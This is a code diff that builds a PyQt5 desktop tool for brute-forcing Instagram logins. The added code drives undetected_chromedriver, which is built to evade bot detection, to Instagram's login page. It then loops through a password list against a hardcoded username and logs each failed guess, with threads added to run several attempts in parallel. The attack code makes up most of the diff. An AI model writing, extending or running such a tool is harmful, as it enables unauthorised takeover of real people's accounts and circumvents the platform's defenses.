@@ -1,15 +1,24 @@
+import threading
+import undetected_chromedriver as uc
+
+import sys
+from PyQt5.QtWidgets import QApplication
 from PyQt5.QtCore import Qt, QDateTime
 from PyQt5.QtWidgets import QWidget, QLabel, QPushButton, QCheckBox, QSlider, QTextEdit
 
-from testcases.test_login import login
+from Resources.pass_to_temp import password_list
+from pages.login_page import LoginPage
 
-# Déclaration des variables globales
+# Déclaration des variables global
 headless = False
-cpu = 5
-
-
-def run():
-    login(core)
+core = 1
+processes = []
+# Config var
+url = 'https://www.instagram.com/accounts/login/'
+input_file = "../test.txt"
+num_temp = 1
+# groups = split_words(password_list(input_file), num_temp)
+username = 'Tim0ut_13'
 
 
 class Fenetre(QWidget):
@@ -84,14 +93,97 @@ class Fenetre(QWidget):
         self.sliderCPU.valueChanged.connect(self.updateLabelCPU)
 
         # Connexion de la fonction run au boutonRun
-        self.boutonRun.clicked.connect(run)
+        self.boutonRun.clicked.connect(self.run)
 
         # Affichage de la fenêtre
         self.show()
 
     def updateLabelCPU(self):
+        global core
         self.nbrCPU.setText(str(self.sliderCPU.value()))
+        core = self.sliderCPU.value()
 
     def print_message(self, message):
         now = QDateTime.currentDateTime()
         self.console.append(f"{now.toString('hh:mm:ss')} $ {message}")
+
+    def run(self):
+        global core
+        self.print_message(core)
+        # Create Thread for each core
+        threads = []
+        for i in range(core):
+            thread = threading.Thread(target=self.login(i))
+            thread.start()
+            threads.append(thread)
+        # Wait for all the threads to finish
+        for thread in threads:
+            thread.join()
+        # Show results
+        for thread in threads:
+            self.print_message(thread.result)
+
+    def login(self, i):
+
+        # Configuration of chrome driver options
+        self.print_message(f'Core n°{i} - Starting........')
+        self.print_message(f'Core n°{i} - Driver configuration')
+        options = uc.ChromeOptions()
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--blink-settings=imagesEnabled=false")
+        prefs = {}
+        prefs["profile.managed_default_content_settings.images"] = 2
+        options.add_experimental_option("prefs", prefs)
+        options.add_argument("--disable-gpu")
+
+        # Configuration of headless mode
+        if headless:
+            self.print_message(f'Core n°{i} - Headless mode activated')
+            options.add_argument("--headless")
+        else:
+            self.print_message(f'Core n°{i} - Headless mode deactivated')
+
+        # Creating instance of Chrome driver
+        self.print_message(f'Core n°{i} - Driver creation')
+        driver = uc.Chrome(version_main=116, options=options)
+        self.print_message(f'Core n°{i} - Driver created')
+        self.print_message(f'Core n°{i} - Starting page')
+        login_page = LoginPage(driver, i)
+        driver.implicitly_wait(3)
+
+        ct = 0
+
+        # Todo:
+        #   1. password_list() method who return a list of strings
+        #   form a temp file. Charge the list from file HERE
+        self.print_message(f'Core n°{i} - Connecting to {url}')
+        login_page.open_page(url)
+        self.print_message(f'Core n°{i} - handling cookies')
+        login_page.is_cookies_here()
+
+        # temp = password_list(f'temp{proc}.txt')
+        temp = password_list(input_file)
+
+        # t = (datetime.now() - t1).seconds
+        # print(f'Config Exec Time : {t}')
+
+        for password in temp:
+            # t1 = datetime.now()
+            ct += 1
+            self.print_message(f'Core n°{i} - ({ct}) trying password [{password}]')
+            login_page.login_action(username, password)
+            login_page.is_password_works(password, ct)
+            if login_page.test == 'wrong':
+                self.print_message(f'Core n°{i} - ({ct}) wrong password [{password}]')
+            # t = (datetime.now() - t1).seconds
+            # print(f'Trying Password Exec Time : {t}')
+
+
+if __name__ == "__main__":
+    app = QApplication(sys.argv)
+    fenetre = Fenetre()
+    fenetre.show()
+
+    # Execut QT application
+    app.exec_()
